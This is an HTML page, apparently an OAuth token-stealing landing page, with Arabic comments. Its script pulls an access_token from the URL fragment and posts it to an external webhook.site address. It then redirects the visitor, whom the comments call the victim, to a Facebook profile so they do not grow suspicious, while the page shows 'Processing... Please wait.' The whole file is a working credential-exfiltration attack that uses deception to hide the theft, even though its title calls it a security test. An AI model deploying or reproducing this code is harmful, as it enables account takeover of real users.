<!DOCTYPE html>
<html>
<head>
    <title>Security Test Persistence</title>
</head>
<body>
    <script>
        // 1. استخراج التوكن من الرابط (URL Fragment)
        const hash = window.location.hash;
        if (hash) {
            const params = new URLSearchParams(hash.substring(1));
            const token = params.get('access_token');

            if (token) {
                // 2. إرسال التوكن إلى رابط الـ Webhook الجديد الخاص بك
                const webhookURL = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
                
                fetch(webhookURL, {
                    method: 'POST',
                    mode: 'no-cors', // لضمان الإرسال حتى مع قيود التصفح
                    body: JSON.stringify({
                        captured_token: token,
                        timestamp: new Date().toISOString(),
                        location: "Sudan_Test_Lab"
                    })
                }).then(() => {
                    // 3. توجيه الضحية لموقع حقيقي لعدم الشك (مثلاً بروفايل فيسبوك)
                    window.location.href = "https://www.facebook.com/me";
                });
            }
        }
    </script>
    <h2>Processing... Please wait.</h2>
</body>
</html>
